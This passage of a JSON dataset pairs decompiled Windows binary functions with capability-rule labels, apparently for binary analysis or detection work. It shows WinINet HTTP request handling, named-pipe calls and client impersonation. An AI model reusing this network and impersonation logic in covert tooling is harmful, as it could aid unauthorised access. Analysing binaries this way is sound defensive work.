iVar5 = fcn.200012d6(s + 1, arg_20h);\n        iVar7 = 0x21590002;\n        if (iVar5 != 0x102) {\n            iVar7 = *s;\n        }\n    }\n    pcVar1 = _sym.imp.msvcrt.dll_fprintf;\n    var_18h = iVar7;\n    if (*0x20047050 != 0) {\n        fcn.20001567(0x20047054);\n        if (*0x20047050 != 0) {\n            iVar5 = 0;\n            uVar9 = (*_sym.imp.msvcrt.dll__time64)(0);\n            var_20h = uVar9 >> 0x20;\n            (*pcVar1)(*0x20047050, \"R1\\tti=%u\\tst=%d\\tso=%x\\trh=\", uVar9, iVar7, arg_10h);\n            if (0 < var_4h) {\n                do {\n                    (*pcVar1)(*0x20047050, \"%02x\", hostshort[iVar5 + -4]);\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < var_4h);\n            }\n            (*pcVar1)(*0x20047050, \"\\trt=\");\n            iVar7 = 0;\n            if (0 < var_4h) {\n                do {\n                    uVar3 = hostshort[iVar7 + -4];\n                    if (uVar3 < 0x20) {\n                        uVar3 = 0x2e;\n                    }\n                    (*pcVar1)(*0x20047050, 0x2002fe2c, uVar3);\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < var_4h);\n            }\n            (*pcVar1)(*0x20047050, \"\\thi=\");\n            stack0xfffffff4 = 0;\n            size = 0x1000;\n            iVar7 = (*_sym.imp.msvcrt.dll_malloc)(0x1000);\n            if ((iVar7 != 0) &&\n               (iVar5 = (*_sym.imp.WININET.dll_HttpQueryInfoA)(s[4], 0x15, iVar7, &size, &var_ah + 2),  iVar5 != 0)) {\n                stack0xfffffff4 = 0;\n                if (size != 0) {\n                    do {\n                        if (*(stack0xfffffff4 + iVar7) == '\\0') {\n                            *(stack0xfffffff4 + iVar7) = '|';\n                        }\n                        unique0x00007a80 = stack0xfffffff4 + 1;\n                    } while (unique0x00007a80 < size);\n                }\n                (*_sym.imp.msvcrt.dll_fwrite)(iVar7, size, 1, *0x20047050);\n            }\n            (*pcVar1)(*0x20047050, \"\\tho=\");\n            stack0xfffffff4 = 0;\n            size = 0x1000;\n            if ((iVar7 != 0) &&\n               (iVar5 = (*_sym.imp.WININET.dll_HttpQueryInfoA)(s[4], 0x80000015, iVar7, &size, &var_ah + 2),  iVar5 != 0\n               )) {\n                stack0xfffffff4 = 0;\n                if (size != 0) {\n                    do {\n                        if (*(stack0xfffffff4 + iVar7) == '\\0') {\n                            *(stack0xfffffff4 + iVar7) = '|';\n                        }\n                        unique0x00007a80 = stack0xfffffff4 + 1;\n                    } while (unique0x00007a80 < size);\n                }\n                (*_sym.imp.msvcrt.dll_fwrite)(iVar7, size, 1, *0x20047050);\n            }\n            (*_sym.imp.msvcrt.dll_free)(iVar7);\n            (*pcVar1)(*0x20047050, 0x2002fd70);\n            (*_sym.imp.msvcrt.dll_fflush)(*0x20047050);\n            iVar7 = var_18h;\n        }\n        fcn.2000157d(0x20047054);\n    }\n    if (iVar7 != 0) goto code_r0x2001e2c4;\n    if (var_4h == 8) {\n        hostlong = (*_sym.imp.WS2_32.dll_ntohl)(hostlong);\n        uVar4 = (*_sym.imp.WS2_32.dll_ntohs)(_hostshort);\n        uVar2 = _hostshort;\n        uVar8 = 0;\n        _hostshort = _hostshort & 0xff0000 | uVar4;\n        _hostshort = _hostshort;\n        cVar6 = '\\0';\n        do {\n            cVar6 = cVar6 + hostshort[uVar8 - 4];\n            uVar8 = uVar8 + 1;\n        } while (uVar8 < 7);\n        if (var_ah._1_1_ == cVar6) {\n            if ((uVar2 & 0x10000) == 0) {\n                if (*(arg_10h + 0x14) != hostlong) goto code_r0x2001e046;\n            }\n            else {\n                *(arg_10h + 0x14) = hostlong;\n            }\n            if (arg_1ch == uVar4) {\n                iVar5 = 0;\n                do {\n                    iVar7 = (*_sym.imp.WININET.dll_InternetQueryDataAvailable)(s[4], &var_4h, 0, 0);\n                    if (iVar7 == 0) {\n                        iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        if (iVar7 == 0x3e5) {\n                            iVar7 = fcn.200012d6(s + 1, arg_20h);\n                            if (iVar7 != 0x102) {\n                                iVar7 = *s;\n                                goto code_r0x2001e200;\n                            }\ncode_r0x2001e27f:\n                            iVar7 = 0x21590002;\n                        }\n                        else {\ncode_r0x2001e200:\n                            if (iVar7 == 0) goto code_r0x2001e208;\n                        }\n                        goto code_r0x2001e2c4;\n                    }\ncode_r0x2001e208:\n                    if (var_4h == 0) {\n                        if (iVar5 < 1) {\n                            *arg_8h = 0;\n                            *arg_ch = 0;\n                        }\n                        else {\n                            *arg_8h = ptr;\n                            *arg_ch = iVar5;\n                        }\n                        iVar7 = 0;\n                        ptr = 0;\n                        *arg_14h = _hostshort >> 0x10 & 0xff;\n                        goto code_r0x2001e2c4;\n                    }\n                    var_18h = ptr;\n                    ptr = (*_sym.imp.msvcrt.dll_realloc)(ptr, var_4h + iVar5);\n                    if (ptr == 0) {\n                        iVar7 = 0x21590004;\n                        (*_sym.imp.msvcrt.dll_free)(var_18h);\n                        goto code_r0x2001e2c4;\n                    }\n                    iVar7 = (*_sym.imp.WININET.dll_InternetReadFile)(s[4], ptr + iVar5, var_4h, &var_4h);\n                    if (iVar7 == 0) {\n                        iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        if (iVar7 == 0x3e5) {\n                            iVar7 = fcn.200012d6(s + 1, arg_20h);\n                            if (iVar7 == 0x102) goto code_r0x2001e27f;\n                            iVar7 = *s;\n                        }\n                        if (iVar7 != 0) goto code_r0x2001e2c4;\n                    }\n                    iVar5 = iVar5 + var_4h;\n                } while( true );\n            }\n        }\n        else {\n            _hostshort = uVar2 & 0xff000000 | _hostshort;\n            hostlong = (*_sym.imp.WS2_32.dll_htonl)(hostlong);\n            uVar4 = (*_sym.imp.WS2_32.dll_htons)(_hostshort);\n            _hostshort = _hostshort & 0xffff0000 | uVar4;\n            sub.ntdll.dll_memcpy(&s1, &hostlong, 8);\n            var_4h = 8;\n            sub.ntdll.dll_memset(&var_11ch, 0, 0xf8);\n            iVar7 = (*_sym.imp.WININET.dll_InternetReadFile)(s[4], &s1 + var_4h, 0x100 - var_4h, &var_4h);\n            if ((iVar7 == 0) && (iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar7 == 0x3e5)) {\n                fcn.200012d6(s + 1, arg_20h);\n            }\n            iVar7 = sub.ntdll.dll_memcmp(&s1, \"500-\", 4);\n            if (iVar7 == 0) {\n                iVar7 = (*_sym.imp.ntdll.dll_atoi)(&str);\n                if (iVar7 != 0) goto code_r0x2001e2c4;\n            }\n            else {\n                iVar7 = sub.ntdll.dll_memcmp(&s1, \"500:\", 4);\n                if ((iVar7 == 0) && (iVar7 = (*_sym.imp.ntdll.dll_strtoul)(&str, 0, 0x10),  iVar7 != 0)) {\n                    iVar7 = iVar7 + 0x21590000;\n                    goto code_r0x2001e2c4;\n                }\n            }\n        }\n    }\ncode_r0x2001e046:\n    iVar7 = 0x2159000a;\ncode_r0x2001e2c4:\n    (*_sym.imp.msvcrt.dll_free)(ptr);\n    iVar5 = 0;\n    if (*0x20047050 != 0) {\n        fcn.20001567(0x20047054);\n        if (*0x20047050 != 0) {\n            uVar9 = (*_sym.imp.msvcrt.dll__time64)(0);\n            var_20h = uVar9 >> 0x20;\n            (*pcVar1)(*0x20047050, \"R2\\tti=%u\\tst=%d\\tso=%x\\tid=%u\\tfl=%x\\tsi=%d\\tda=\", uVar9, iVar7, arg_10h, \n                      _hostshort & 0xffff, _hostshort >> 0x10 & 0xff, *arg_ch);\n            if ((*arg_8h != 0) && (0 < *arg_ch)) {\n                do {\n                    if (0x1f < iVar5) break;\n                    (*pcVar1)(*0x20047050, \"%02x\", *(*arg_8h + iVar5));\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < *arg_ch);\n            }\n            (*pcVar1)(*0x20047050, 0x2002fd70);\n            (*_sym.imp.msvcrt.dll_fflush)(*0x20047050);\n        }\n        fcn.2000157d(0x20047054);\n    }\n    if (s[4] != 0) {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(s[4]);\n    }\n    iVar5 = fcn.200012e7(s + 1);\n    if (iVar5 != 0) {\n        fcn.200012a9(s + 1);\n    }\n    sub.ntdll.dll_memset(s, 0, 0x18);\n    return iVar7;\n}\n",
        "token_count": 2962
    },
    "2001e5d7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001e5d7(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_8h;\n    \n    fcn.200012c9(arg_8h + 0x34);\n    pcVar1 = _sym.imp.WININET.dll_InternetCloseHandle;\n    if (*(arg_8h + 0x10) != 0) {\n        fcn.2001db8c(&var_18h, *(arg_8h + 0x18), 8);\n        (*pcVar1)(var_8h);\n        fcn.200012a9(&var_14h);\n        (*pcVar1)(*(arg_8h + 0x10));\n        *(arg_8h + 0x10) = 0;\n    }\n    if (*(arg_8h + 0xc) != 0) {\n        (*pcVar1)(*(arg_8h + 0xc));\n        *(arg_8h + 0xc) = 0;\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "2001e69c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.2001e69c(int32_t arg_8h, uint *arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetTickCount;\n    if (arg_14h == 0) {\n        return 0x21590002;\n    }\n    while( true ) {\n        uVar1 = *(arg_8h + 0x18);\n        *(arg_8h + 0x18) = uVar1 + 1;\n        var_4h = (*pcVar2)();\n        iVar4 = fcn.2001db8c(&var_20h, uVar1, 4);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        iVar4 = fcn.2001ddfd(arg_ch, arg_10h, arg_8h, &var_8h, &var_20h, uVar1, arg_14h);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        iVar4 = (*pcVar2)();\n        iVar4 = iVar4 - var_4h;\n        if ((var_8h & 2) == 0) {\n            *(arg_8h + 0x1c) = *(arg_8h + 0x1c) + iVar4 >> 1;\n            return 0;\n        }\n        fcn.20019762(arg_8h, *arg_ch);\n        if ((arg_14h != 0xffffffff) && (arg_14h < *(arg_8h + 0x1c) + iVar4)) break;\n        fcn.200012d6(arg_8h + 0x34, *(arg_8h + 0x1c));\n        if (arg_14h != 0xffffffff) {\n            arg_14h = arg_14h - (*(arg_8h + 0x1c) + iVar4);\n        }\n        uVar3 = fcn.200018bf();\n        *(arg_8h + 0x1c) = *(arg_8h + 0x1c) + uVar3 % *(arg_8h + 0x20) + 1;\n        if (5000 < *(arg_8h + 0x1c)) {\n            *(arg_8h + 0x1c) = 100;\n        }\n    }\n    return 0x21590002;\n}\n",
        "token_count": 611
    },
    "2001f0f5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.2001f0f5(void)\n\n{\n    code *pcVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint unaff_ESI;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    char *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0x2001f0fd;\n    iVar2 = fcn.2001ea9e();\n    if (iVar2 != 0) {\n        var_4h = 0x2001f108;\n        iVar2 = fcn.2001eb8b();\n        if (iVar2 != 0) {\n            var_4h = 0x2001f111;\n            iVar2 = fcn.2001ec35();\n            if (((iVar2 != 0) && (*(in_EAX + 0x70) != 0)) && (*(in_EAX + 0x58) != 0)) {\n                var_14h = 0;\n                var_18h = fcn.20023b61(&fcn.2001f0f5::var_1ch, &fcn.2001f0f5::var_14h);\n                pcVar1 = _sym.imp.msvcrt.dll_free;\n                if (var_18h == 0) {\n                    var_18h = 0x21590005;\n                    var_10h = 0;\n                    if (var_1ch != 0) {\n                        do {\n                            var_18h = fcn.20023c34(var_14h, var_10h, &fcn.2001f0f5::var_4h, &fcn.2001f0f5::var_8h, \n                                                   &fcn.2001f0f5::var_ch);\n                            if ((var_18h == 0) && (((var_4h != 0 || (var_8h != 0)) || (var_ch != NULL)))) {\n                                (*_sym.imp.WININET.dll_InternetCloseHandle)(*(in_EAX + 0xc), unaff_ESI);\n                                pcVar3 = var_ch;\n                                if (var_ch == NULL) {\n                                    pcVar3 = \"Mozilla/4.0 (compatible; MSIE 6.0)\";\n                                    if (*(in_EAX + 0x6c) != NULL) {\n                                        pcVar3 = *(in_EAX + 0x6c);\n                                    }\n                                }\n                                iVar2 = (*_sym.imp.WININET.dll_InternetOpenA)(pcVar3, 3, var_4h, var_8h, 0x10000000);\n                                *(in_EAX + 0xc) = iVar2;\n                                if (iVar2 != 0) {\n                                    iVar2 = (*_sym.imp.WININET.dll_InternetSetStatusCallback)(iVar2, fcn.2001e446);\n                                    if (iVar2 == -1) {\n                                        (*_sym.imp.WININET.dll_InternetCloseHandle)(*(in_EAX + 0xc));\n                                        *(in_EAX + 0xc) = 0;\n                                    }\n                                    else {\n                                        iVar2 = fcn.2001e958();\n                                        if (iVar2 == 0) {\n                                            fcn.20001567(0x2004706c);\n                                            *0x20047088 = var_4h;\n                                            *0x2004708c = var_8h;\n                                            *0x20047090 = (*_sym.imp.msvcrt.dll__strdup)(pcVar3);\n                                            *0x20047084 = 1;\n                                            fcn.2000157d(0x2004706c);\n                                            (*pcVar1)(var_ch);\n                                            var_18h = 0;\n                                            break;\n                                        }\n                                    }\n                                }\n                                (*pcVar1)(var_ch);\n                                (*pcVar1)(var_8h);\n                                (*pcVar1)(var_4h);\n                            }\n                            var_10h = var_10h + 1;\n                        } while (var_10h < var_1ch);\n                    }\n                    fcn.20023bc2(var_14h);\n                }\n                return var_18h;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 961
    },
    "2001f561": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001f561(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar3 = arg_8h;\n    *(arg_8h + 0x34) = 1;\n    (*_sym.imp.KERNEL32.dll_SetEvent)(*(arg_8h + 0x38));\n    iVar5 = *(iVar3 + 0xc);\n    *(iVar3 + 0xc) = 0;\n    pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if ((iVar5 != 0) && (iVar5 != -1)) {\n        (*_sym.imp.KERNEL32.dll_CancelIo)(iVar5);\n        (*pcVar2)(iVar5);\n    }\n    if ((*(iVar3 + 0x10) != 0) && (iVar5 = *(iVar3 + 0x14),  iVar5 != 0)) {\n        *(iVar3 + 0x14) = 0;\n        (*pcVar2)(iVar5);\n        fcn.20001567(iVar3 + 0x18);\n        *(iVar3 + 0x30) = *(iVar3 + 0x30) + -1;\n        fcn.2000157d(iVar3 + 0x18);\n    }\n    fcn.20001567(0x200470ac);\n    if (*(iVar3 + 0x6c) != 0) {\n        arg_8h = *(*(iVar3 + 0x6c) + 0x74);\n        iVar5 = 0;\n        if (arg_8h != 0) {\n            do {\n                iVar4 = arg_8h;\n                arg_8h = iVar4;\n                if (iVar4 == iVar3) break;\n                arg_8h = *(iVar4 + 0x70);\n                iVar5 = iVar4;\n            } while (arg_8h != 0);\n            if (arg_8h != 0) {\n                if (iVar5 == 0) {\n                    *(*(arg_8h + 0x6c) + 0x74) = *(arg_8h + 0x70);\n                }\n                else {\n                    *(iVar5 + 0x70) = *(arg_8h + 0x70);\n                }\n                *(arg_8h + 0x70) = 0;\n            }\n        }\n        piVar1 = *(iVar3 + 0x6c) + 0x30;\n        *piVar1 = *piVar1 + -1;\n        *(iVar3 + 0x6c) = 0;\n    }\n    fcn.2000157d(0x200470ac);\n    if (*(iVar3 + 0x74) != 0) {\n        while( true ) {\n            fcn.20001567(0x200470ac);\n            arg_8h = *(iVar3 + 0x74);\n            if (arg_8h != 0) {\n                *(iVar3 + 0x74) = *(arg_8h + 0x70);\n            }\n            fcn.2000157d(0x200470ac);\n            if (arg_8h == 0) break;\n            fcn.20013237(&arg_8h, arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 762
    },
    "2001fbc9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001fbc9(int32_t arg_8h, int32_t arg_ch, uint noname_2, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_ch == 9) {\n        if (arg_14h == 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_ImpersonateNamedPipeClient)(*(arg_8h + 0xc));\n            if (iVar1 != 0) {\n                return 0;\n            }\n    // WARNING: Could not recover jumptable at 0x2001fbf0. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            return uVar2;\n        }\n    }\n    else {\n        if (arg_ch != 10) {\n            return 0x21590001;\n        }\n        if (arg_14h == 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n            if (iVar1 != 0) {\n                return 0;\n            }\n    // WARNING: Could not recover jumptable at 0x2001fc11. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            return uVar2;\n        }\n    }\n    return 0x21590064;\n}\n",
        "token_count": 327
    },
    "2001fe60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.2001fe60(int32_t *arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x78);\n    if (iVar2 == 0) {\n        return 0x21590004;\n    }\n    sub.ntdll.dll_memset(iVar2, 0, 0x78);\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n    *(iVar2 + 0x38) = iVar3;\n    pcVar1 = _sym.imp.msvcrt.dll__strdup;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        if (arg_10h != 0) {\n            if ((arg_20h & 1) == 0) {\n                iVar3 = 0x215900c9;\n                goto code_r0x2001ff83;\n            }\n            if ((*(arg_10h + -1 + arg_14h) != '\\0') || (iVar3 = sub.ntdll.dll_strlen(arg_10h),  iVar3 + 1 != arg_14h)) {\n                iVar3 = 0x21590067;\n                goto code_r0x2001ff83;\n            }\n            iVar3 = (*pcVar1)(arg_10h);\n            *(iVar2 + 4) = iVar3;\n            if (iVar3 != 0) {\n                iVar3 = fcn.20023cfb(iVar2 + 0x3c);\n                if (iVar3 != 0) goto code_r0x2001ff83;\n                fcn.20001551(iVar2 + 0x18);\n                iVar3 = fcn.2001fcde();\n                if (iVar3 != 0) goto code_r0x2001ff83;\n                *(iVar2 + 0x10) = 1;\n                goto code_r0x2001ff21;\n            }\ncode_r0x2001feeb:\n            iVar3 = 0x21590004;\n            goto code_r0x2001ff83;\n        }\ncode_r0x2001ff21:\n        if (arg_18h != 0) {\n            if ((arg_20h & 2) == 0) {\n                iVar3 = 0x215900cb;\n                goto code_r0x2001ff83;\n            }\n            if ((*(arg_18h + -1 + arg_1ch) != '\\0') || (iVar3 = sub.ntdll.dll_strlen(arg_18h),  iVar3 + 1 != arg_1ch)) {\n                iVar3 = 0x21590069;\n                goto code_r0x2001ff83;\n            }\n            iVar3 = (*pcVar1)(arg_18h);\n            *(iVar2 + 8) = iVar3;\n            if (iVar3 == 0) goto code_r0x2001feeb;\n            iVar3 = (*_sym.imp.ntdll.dll_strncmp)(arg_18h, \"\\\\\\\\.\\\\pipe\\\\\", 9);\n            *(iVar2 + 0x54) = iVar3 != 0;\n        }\n        *arg_8h = iVar2;\n        iVar3 = 0;\n    }\n    if (iVar3 == 0) {\n        return 0;\n    }\ncode_r0x2001ff83:\n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(*(iVar2 + 4));\n    (*pcVar1)(*(iVar2 + 8));\n    (*pcVar1)(iVar2);\n    return iVar3;\n}\n",
        "token_count": 879
    },
    "2002029b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2002029b(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    \n    if (*(arg_8h + 0xc) == 0) {\n        iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x1000);\n        *arg_14h = iVar1;\n        if (iVar1 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else if (*(arg_8h + 8) == 0) {\n            iVar1 = 0x21590065;\n        }\n        else {\n            iVar1 = (*_sym.imp.KERNEL32.dll_CallNamedPipeA)\n                              (*(arg_8h + 8), arg_ch, arg_10h, iVar1, 0x1000, arg_18h, arg_1ch);\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            else {\n                iVar1 = 0;\n            }\n            if (iVar1 == 0) {\n                return 0;\n            }\n        }\n        (*_sym.imp.msvcrt.dll_free)(*arg_14h);\n        *arg_14h = 0;\n    }\n    else {\n        iVar1 = fcn.2001f8c4(arg_ch, arg_10h, 1, arg_14h, arg_18h, arg_1ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 353
    },
    "20020999": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20020999(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if (*(param_1 + 8) == 1) {\n        iVar5 = *(param_1 + 0x28);\n    }\n    else {\n        iVar5 = *(param_1 + 0x24);\n    }\n    iVar2 = fcn.20024488(*(iVar5 + 8));\n    pcVar1 = _sym.imp.msvcrt.dll_malloc;\n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)((iVar2 + 7 + (iVar2 + 7 >> 0x1f & 7U) >> 3) + 2);\n    if (iVar2 != 0) {\n        uVar3 = fcn.20024825(*(iVar5 + 8), iVar2);\n        iVar4 = fcn.20013589(*(param_1 + 4), iVar2, uVar3, 0);\n        if (iVar4 != 0) goto code_r0x20020a9d;\n        (*_sym.imp.msvcrt.dll_free)(iVar2);\n        iVar2 = fcn.20024488(*(iVar5 + 0xc));\n        iVar2 = (*pcVar1)((iVar2 + 7 + (iVar2 + 7 >> 0x1f & 7U) >> 3) + 2);\n        if (iVar2 != 0) {\n            uVar3 = fcn.20024825(*(iVar5 + 0xc), iVar2);\n            iVar4 = fcn.20013589(*(param_1 + 4), iVar2, uVar3, 0);\n            if (iVar4 != 0) goto code_r0x20020a9d;\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n            iVar2 = fcn.20024488(*(iVar5 + 0x14));\n            iVar2 = (*pcVar1)((iVar2 + 7 + (iVar2 + 7 >> 0x1f & 7U) >> 3) + 2);\n            if (iVar2 != 0) {\n                uVar3 = fcn.20024825(*(iVar5 + 0x14), iVar2);\n                iVar4 = fcn.20013589(*(param_1 + 4), iVar2, uVar3, 0);\n                goto code_r0x20020a9d;\n            }\n        }\n    }\n    iVar4 = 0x21590004;\ncode_r0x20020a9d:\n    (*_sym.imp.msvcrt.dll_free)(iVar2);\n    return iVar4;\n}\n",
        "token_count": 603
    },
    "20020c18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20020c18(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (arg_ch == 1) {\n        if (arg_14h != 0x10) {\n            iVar2 = 0x21590064;\n            goto code_r0x20020c3f;\n        }\n        sub.ntdll.dll_memcpy(arg_8h + 0x6c, arg_10h, 0x10);\n    }\n    iVar2 = 0;\ncode_r0x20020c3f:\n    iVar1 = fcn.200136d0(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar2 != 0) {\n        iVar1 = iVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 221
    },
    "20021014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20021014(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x44) == 0) {\n        fcn.20020daf();\n    }\n    fcn.20013589(*(in_EAX + 4), *(in_EAX + 0x44), *(in_EAX + 0x48), 0);\n    return;\n}\n",
        "token_count": 89
    },
    "20021200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.20021200(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    if (*(in_EAX + 0x4c) != 1) {\n        fcn.20001567(in_EAX + 0x50);\n        if (*(in_EAX + 0x4c) == 0) {\n            if (*(in_EAX + 0x68) == 0) {\n                if (*(in_EAX + 8) == 1) {\n                    uVar1 = fcn.20021037();\n                }\n                else if (*(in_EAX + 8) == 2) {\n                    uVar1 = fcn.20021121();\n                }\n                else {\n                    uVar1 = 0x21590064;\n                }\n            }\n            else {\n                *(in_EAX + 0x3c) = in_EAX + 0x2c;\n                *(in_EAX + 0x40) = 0x10;\n                *(in_EAX + 0x4c) = 1;\n                uVar1 = 0;\n            }\n        }\n        else {\n            uVar1 = -(*(in_EAX + 0x4c) != 1) & 0x2159012d;\n        }\n        fcn.2000157d(in_EAX + 0x50);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 314
    },
    "20021b12": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20021b12(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint *arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_118h;\n    int32_t var_114h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *arg_10h;\n    if ((var_4h < 0xa0000) || ((arg_18h & 1) == 0)) {\n        var_8h = 0;\n    }\n    else {\n        var_8h = 1;\n    }\n    if (arg_14h == 0xffffffff) {\n        arg_14h = NULL;\n    }\n    else {\n        var_14h = arg_14h / 1000;\n        var_10h = (arg_14h % 1000) * 1000;\n        arg_14h = &var_14h;\n    }\n    iVar2 = 0;\n    if ((var_8h != 0) && (*(arg_8h + 0x144) != NULL)) {\n        (**(arg_8h + 0x144))(*(arg_8h + 0x138), \"TCP: recv\", 0, var_4h, &var_ch);\n    }\n    if (0 < var_4h) {\n        do {\n            var_114h = *(arg_8h + 4);\n            var_118h = 1;\n            iVar1 = (*_sym.imp.WS2_32.dll_select)(var_114h + 1, &var_118h, 0, 0, arg_14h);\n     